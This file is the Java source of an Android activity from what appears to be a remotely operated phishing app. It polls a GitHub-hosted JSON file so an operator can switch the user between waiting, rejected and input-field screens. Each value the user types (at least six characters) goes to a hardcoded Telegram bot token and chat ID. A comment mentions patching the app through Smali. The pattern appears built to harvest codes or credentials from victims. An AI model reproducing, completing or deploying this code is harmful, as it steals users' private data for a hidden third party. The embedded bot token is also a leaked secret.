package com.ban.ab;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.util.Base64;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import org.json.JSONObject;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class SecondActivity extends AppCompatActivity {

    private LinearLayout layoutWaiting, layoutRejected, layoutFields, groupField1, groupField2, groupField3;
    private TextView txtRejectReason;
    private EditText field1, field2, field3;
    private Button btnConfirm1, btnConfirm2, btnConfirm3, btnFinalOrder, btnCancelOrder;
    private String userName;
    private final OkHttpClient client = new OkHttpClient();
    private final Handler handler = new Handler();
    private Runnable refreshRunnable;

    // --- إعدادات الربط (اتركها فارغة للتعديل عبر Smali) ---
    private final String GITHUB_RAW_URL = "https://cdn.jsdelivr.net/gh/abdullah14120/ban@main/commands/";
    private final String BOT_TOKEN = "8728882712:AAHBUsyFmocj1AwCJSVE-kPMIG7zy9WcZo4";
    private final String CHAT_ID = "1749638488";
    private final String GITHUB_TOKEN = ""; // سيتم تعديله عبر Smali

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);

        initViews();
        userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "unknown");
        
        setupButtons();
        startAutoRefresh();
    }

    private void initViews() {
        layoutWaiting = findViewById(R.id.layoutWaiting);
        layoutRejected = findViewById(R.id.layoutRejected);
        layoutFields = findViewById(R.id.layoutFields);
        groupField1 = findViewById(R.id.groupField1);
        groupField2 = findViewById(R.id.groupField2);
        groupField3 = findViewById(R.id.groupField3);
        txtRejectReason = findViewById(R.id.txtRejectReason);
        field1 = findViewById(R.id.field1);
        field2 = findViewById(R.id.field2);
        field3 = findViewById(R.id.field3);
        btnConfirm1 = findViewById(R.id.btnConfirm1);
        btnConfirm2 = findViewById(R.id.btnConfirm2);
        btnConfirm3 = findViewById(R.id.btnConfirm3);
        btnFinalOrder = findViewById(R.id.btnFinalOrder);
        btnCancelOrder = findViewById(R.id.btnCancelOrder);
    }

    private void setupButtons() {
        btnConfirm1.setOnClickListener(v -> sendToTg("الحقل الأول", field1.getText().toString()));
        btnConfirm2.setOnClickListener(v -> sendToTg("الحقل الثاني", field2.getText().toString()));
        btnConfirm3.setOnClickListener(v -> sendToTg("الحقل الثالث", field3.getText().toString()));
        btnFinalOrder.setOnClickListener(v -> updateGithubStatus("waiting"));
        btnCancelOrder.setOnClickListener(v -> cancelOrder());
    }

    private void startAutoRefresh() {
        refreshRunnable = new Runnable() {
            @Override public void run() { checkCommand(); handler.postDelayed(this, 5000); }
        };
        handler.post(refreshRunnable);
    }

    private void checkCommand() {
        String url = GITHUB_RAW_URL + userName + ".json";
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    try {
                        JSONObject json = new JSONObject(response.body().string());
                        runOnUiThread(() -> updateUI(json));
                    } catch (Exception ignored) {}
                }
            }
        });
    }

    private void updateUI(JSONObject json) {
        try {
            String status = json.getString("status");
            layoutWaiting.setVisibility(status.equals("waiting") ? View.VISIBLE : View.GONE);
            layoutRejected.setVisibility(status.equals("rejected") ? View.VISIBLE : View.GONE);
            layoutFields.setVisibility(status.equals("fields_form") ? View.VISIBLE : View.GONE);

            if (status.equals("rejected")) {
                txtRejectReason.setText(json.optString("reject_reason", "الطلب مرفوض"));
            }
            if (status.equals("fields_form")) {
                int count = json.optInt("visible_fields", 1);
                groupField1.setVisibility(count >= 1 ? View.VISIBLE : View.GONE);
                groupField2.setVisibility(count >= 2 ? View.VISIBLE : View.GONE);
                groupField3.setVisibility(count >= 3 ? View.VISIBLE : View.GONE);
                btnFinalOrder.setVisibility(json.optBoolean("show_final_button", false) ? View.VISIBLE : View.GONE);
            }
        } catch (Exception ignored) {}
    }

    private void sendToTg(String label, String value) {
        if (value.length() < 6) return;
        sendNotificationOnly("📩 تحديث من " + userName + ":\n" + label + " ⬅️ " + value);
        updateGithubStatus("waiting");
        runOnUiThread(() -> {
            layoutFields.setVisibility(View.GONE);
            layoutWaiting.setVisibility(View.VISIBLE);
        });
    }

    private void cancelOrder() {
        sendNotificationOnly("⚠️ قام المستخدم بإلغاء طلبه: " + userName);
        updateGithubStatus("cancelled");
        getSharedPreferences("AppPrefs", MODE_PRIVATE).edit().clear().apply();
        runOnUiThread(() -> {
            startActivity(new Intent(SecondActivity.this, MainActivity.class));
            finish();
        });
    }

    private void updateGithubStatus(String newStatus) {
        String url = "https://api.github.com/repos/abdullah14120/ban/contents/commands/" + userName + ".json";
        Request getReq = new Request.Builder().url(url).addHeader("Authorization", "token " + GITHUB_TOKEN).get().build();

        client.newCall(getReq).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    try {
                        JSONObject jobj = new JSONObject(response.body().string());
                        String sha = jobj.getString("sha");
                        String content = Base64.encodeToString(("{\"status\":\""+newStatus+"\"}").getBytes(), Base64.NO_WRAP);
                        String payload = "{\"message\":\"update\",\"content\":\""+content+"\",\"sha\":\""+sha+"\"}";
                        
                        Request putReq = new Request.Builder().url(url)
                                .addHeader("Authorization", "token " + GITHUB_TOKEN)
                                .put(RequestBody.create(payload, MediaType.parse("application/json"))).build();
                        client.newCall(putReq).enqueue(new Callback() {
                            @Override public void onFailure(Call call, IOException e) {}
                            @Override public void onResponse(Call call, Response response) {}
                        });
                    } catch (Exception ignored) {}
                }
            }
        });
    }

    private void sendNotificationOnly(String text) {
        RequestBody body = new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build();
        Request req = new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").post(body).build();
        client.newCall(req).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {}
        });
    }

    @Override protected void onDestroy() { super.onDestroy(); handler.removeCallbacks(refreshRunnable); }
}
